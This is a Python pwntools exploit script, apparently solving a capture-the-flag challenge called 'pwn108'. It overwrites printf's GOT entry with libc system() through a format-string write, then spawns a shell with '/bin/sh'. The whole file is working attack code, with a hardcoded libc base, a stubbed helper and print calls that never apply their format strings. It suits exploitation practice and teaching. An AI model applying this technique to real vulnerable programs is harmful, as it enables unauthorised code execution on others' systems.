from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Function to be called by FmtStr
def send_payload(payload):
    # io.sendline(payload)
    # return io.recvline
    return 10


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pwn108-1644300489260.pwn108'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()
io.recvuntil(b':')
io.sendline(b'bas')
print(io.recvuntil(b':'))

# Found manually (ASLR_OFF)
libc = elf.libc
#libc.address = 0xf7dba000  # ldd got_overwrite 
libc.address = 0xf7dae000

# Find the offset for format string write
#format_string = FmtStr(execute_fmt=send_payload)
format_string = FmtStr(execute_fmt=send_payload, offset=10)
print("format string offset: %d", format_string.offset)

# Print address to overwrite (printf) and what we want to write (system)
print("address to overwrite (elf.got.printf): %#x", elf.got.printf)
print("address to write (libc.functions.system): %#x", libc.symbols.system)

# Overwrite printf() in GOT with Lib-C system()
# Manual, like in notes.txt
# format_string.write(0x0804c00c, p16(0xf040))  # Lower-order
# format_string.write(0x0804c00e, p16(0xf7df))  # Higher-order
# Or automagically
format_string.write(elf.got.printf, libc.symbols.system)

# Execute the format string writes
format_string.execute_writes()

# Get our flag!
io.sendline(b'/bin/sh')
io.interactive()